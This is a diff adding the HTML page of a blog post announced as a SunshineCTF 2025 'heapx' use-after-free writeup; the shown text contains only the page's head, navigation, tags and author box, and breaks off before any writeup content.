@@ -1,0 +1,2887 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="light"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>SunshineCTF - heapx Challenge Writeup &middot; D3LET3-57</title>
+  <meta name="title" content="SunshineCTF - heapx Challenge Writeup &middot; D3LET3-57" />
+  
+  <meta name="description" content="A detailed writeup for the heapx challenge from SunshineCTF 2025, focusing on heap exploitation techniques." />
+  <meta name="keywords" content="ctf, writeup, pwn, heap, " />
+  
+  
+  <link rel="canonical" href="//localhost:1313/posts/heapx/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.36c3cd7950e4533fa7da3150d972e3edf34d07f83c0264ff04cad0969dfdb3b8a7065b0ed6c730c6d34a7bad516cfc6f6a5917ab1fdb10b25f481f8a17b54c16.css"
+    integrity="sha512-NsPNeVDkUz&#43;n2jFQ2XLj7fNNB/g8AmT/BMrQlp39s7inBlsO1scwxtNKe61RbPxvalkXqx/bELJfSB&#43;KF7VMFg==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.bba497f294a14b70af4ae6f9028397dc7bc3bd265b3598850c6d3501b52e88c3af73a3d8d96978a591241c99896667f2407860d99b4d7d4ba7fea55807f5ac70.js"
+    integrity="sha512-u6SX8pShS3CvSub5AoOX3HvDvSZbNZiFDG01AbUuiMOvc6PY2Wl4pZEkHJmJZmfyQHhg2ZtNfUun/qVYB/WscA==" data-copy="Copy" data-copied="Copied"></script>
+  
+  
+  
+  <script src="/lib/zoom/zoom.min.f592a181a15d2a5b042daa7f746c3721acf9063f8b6acd175d989129865a37d400ae0e85b640f9ad42cd98d1f8ad30931718cf8811abdcc5fcb264400d1a2b0c.js" integrity="sha512-9ZKhgaFdKlsELap/dGw3Iaz5Bj&#43;Las0XXZiRKYZaN9QArg6FtkD5rULNmNH4rTCTFxjPiBGr3MX8smRADRorDA=="></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="SunshineCTF - heapx Challenge Writeup" />
+<meta property="og:description" content="This writeup explains how to solve the heapx challenge by leveraging a UAF bug." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="//localhost:1313/posts/heapx/" /><meta property="og:image" content="//localhost:1313/posts/heapx/featured.jpeg" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2025-09-29T00:00:00+00:00" />
+<meta property="article:modified_time" content="2025-09-29T00:00:00+00:00" />
+
+
+  <meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="//localhost:1313/posts/heapx/featured.jpeg" /><meta name="twitter:title" content="SunshineCTF - heapx Challenge Writeup"/>
+<meta name="twitter:description" content="This writeup explains how to solve the heapx challenge by leveraging a UAF bug."/>
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "",
+    "name": "SunshineCTF - heapx Challenge Writeup",
+    "headline": "SunshineCTF - heapx Challenge Writeup",
+    "description": "This writeup explains how to solve the heapx challenge by leveraging a UAF bug.",
+    "abstract": "A detailed writeup for the heapx challenge from SunshineCTF 2025, focusing on heap exploitation techniques.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/posts\/heapx\/",
+    "author" : {
+      "@type": "Person",
+      "name": "D3LET3-57"
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-09-29T00:00:00\u002b00:00",
+    "datePublished": "2025-09-29T00:00:00\u002b00:00",
+    
+    "dateModified": "2025-09-29T00:00:00\u002b00:00",
+    
+    "keywords": ["ctf","writeup","pwn","heap"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "2472"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="D3LET3-57" />
+  
+  
+  
+  
+  <link href="https://github.com/D3LET3-57" rel="me" />
+  
+  
+  
+  
+  <link href="https://x.com/D3LET3_57" rel="me" />
+  
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 min-h-[130px] opacity-65 pl-[24px] pr-[24px] bg-gradient-to-b from-neutral from-60% dark:from-neutral-800 to-transparent mix-blend-normal" style="z-index:80"></div>
+<div class="fixed inset-x-0 pl-[24px] pr-[24px]" style="z-index:100">
+  <div id="menu-blur" class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div>
+  <div class="relative max-w-[64rem] ml-auto mr-auto">
+    <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3">
+    
+    
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">D3LET3-57</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+
+            
+            
+            
+  <a href="/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Home
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Blog
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="https://github.com/D3LET3-57"  target="_blank"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <span >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+    </span>
+    
+    <p class="text-base font-medium" title="">
+        
+    </p>
+</a>
+
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class=" flex items-center">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+                    <div class="flex items-center justify-center dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
+                <div class="flex items-center justify-center dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 md:hidden">
+
+        <label id="menu-button" class="block">
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li id="menu-close-button">
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Home
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Blog
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="https://github.com/D3LET3-57"  target="_blank"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <div >
+            
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+        </div>
+        
+        <p class="text-bg font-bg" title="">
+            
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  </div>
+</div>
+<script>
+  window.addEventListener('scroll', function (e) {
+    var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+    var background_blur = document.getElementById('menu-blur');
+    background_blur.style.opacity = (scroll / 300);
+  });
+</script>
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+  
+  
+  
+  
+  
+
+
+<div class="w-full rounded-md h-36 md:h-56 lg:h-72 single_hero_basic nozoom" style="background-image:url(/posts/heapx/featured_huf27e941166fd013d60c518bedb380cc3_84410_1200x0_resize_q75_box.jpeg);"></div>
+
+
+
+<div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
+    style="background-image:url(/posts/heapx/background_hu03d264ac95b3b5778477b45de11584d9_35921_1200x0_resize_q75_box.jpeg);">
+    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
+    </div>
+    <div
+        class="absolute inset-0 opacity-30 dark:opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral dark:to-neutral-800 mix-blend-normal">
+    </div>
+</div>
+
+<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
+<script>
+    window.addEventListener('scroll', function (e) {
+        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+        var background_blur = document.getElementById('background-blur');
+        background_blur.style.opacity = (scroll / 300)
+    });
+</script>
+
+
+
+  
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/"
+      ></a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/"
+      >posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/heapx/"
+      >SunshineCTF - heapx Challenge Writeup</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      SunshineCTF - heapx Challenge Writeup
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-09-29T00:00:00&#43;00:00">2025-09-29</time><span class="px-2 text-primary-500">&middot;</span><span>2472 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">12 mins</span><span class="px-2 text-primary-500">&middot;</span>
+
+
+<script type="text/javascript" src="/js/zen-mode.min.eea5245cf9244ecbdf2c150d1c8833226c1541cadf6e98f63a7c9192b1a3676df2c3ec603b14f4cfaaa53971fd9d8955640c0f405bf3de2b43ee7a5fb29ae721.js" integrity="sha512-7qUkXPkkTsvfLBUNHIgzImwVQcrfbpj2OnyRkrGjZ23yw&#43;xgOxT0z6qlOXH9nYlVZAwPQFvz3itD7npfsprnIQ=="></script>
+
+<span class="mb-[2px]">
+    <span id="zen-mode-button"
+          class="text-lg hover:text-primary-500"
+          title="Enable zen mode"
+          data-title-i18n-disable="Enable zen mode"
+          data-title-i18n-enable="Disable zen mode">
+        <span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50px" height="50px">
+    <path fill="currentColor" d="M 12.980469 4 C 9.1204688 4 5.9804688 7.14 5.9804688 11 L 6 26 L 9.9804688 26 L 9.9804688 11 C 9.9804688 9.35 11.320469 8 12.980469 8 L 40.019531 8 C 41.679531 8 43.019531 9.35 43.019531 11 L 43.019531 39 C 43.019531 40.65 41.679531 42 40.019531 42 L 29 42 C 29 43.54 28.420938 44.94 27.460938 46 L 40.019531 46 C 43.879531 46 47.019531 42.86 47.019531 39 L 47.019531 11 C 47.019531 7.14 43.879531 4 40.019531 4 L 12.980469 4 z M 7 28 C 4.794 28 3 29.794 3 32 L 3 42 C 3 44.206 4.794 46 7 46 L 23 46 C 25.206 46 27 44.206 27 42 L 27 32 C 27 29.794 25.206 28 23 28 L 7 28 z M 7 32 L 23 32 L 23.001953 42 L 7 42 L 7 32 z"/>
+</svg>
+  </span>
+
+</span>
+    </span>
+</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/heap/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Heap
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/use-after-free/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Use After Free
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/ctf/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Ctf
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/writeup/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Writeup
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/pwn/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Pwn
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/heap/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Heap
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+      
+      
+        
+        
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+        
+      
+      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
+      alt="D3LET3-57" src="/img/Levi_hu0ff16cd5785970a50d00528b9d8c94bb_455834_192x192_fill_box_center_3.png" />
+    
+  
+  <div class="place-self-center">
+    
+    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+      Author
+    </div>
+    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+      D3LET3-57
+    </div>
+    
+    
+    <div class="text-sm text-neutral-700 dark:text-neutral-400">Don&rsquo;t doxx me, lol!</div>
+    
